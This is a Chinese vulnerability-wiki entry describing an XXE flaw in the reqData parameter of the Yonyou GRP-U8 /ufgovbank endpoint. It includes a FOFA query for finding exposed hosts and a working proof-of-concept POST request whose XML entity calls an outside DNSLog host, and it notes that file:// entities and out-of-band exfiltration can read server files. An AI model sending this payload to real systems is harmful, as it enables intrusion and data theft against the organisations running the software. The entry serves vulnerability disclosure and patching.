---
fofa: "app=\"用友-GRP-U8\""
source: "互联网公开漏洞整理 202309-202406（VulWiki 仓库内汇总条目 §45）"
---

# 用友 GRP-U8 ufgovbank XXE漏洞

# 漏洞描述

用友 GRP-U8 /ufgovbank 接口 reqData 参数存在 XML 外部实体注入（XXE）漏洞。攻击者可通过构造恶意 XML 请求读取服务器敏感文件，或向外部 DNS 发起请求进行盲注探测。

# 影响版本

用友 GRP-U8

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 未公开 | 未知 |

# 漏洞复现

FOFA：app="用友-GRP-U8"

POC/EXP：

```
POST /ufgovbank HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Connection: close

reqData=<?xml version="1.0"?><!DOCTYPE foo SYSTEM "http://c2vkbwbs.dnslog.pw">
```

通过 DNSLog 平台接收外部实体请求回连可确认漏洞存在；进一步可构造 file:// 协议外部实体读取服务器文件，或利用参数实体进行带外数据窃取。

# 漏洞修复

联系用友官方获取安全补丁，禁用 XML 外部实体解析，对 reqData 参数做严格校验。
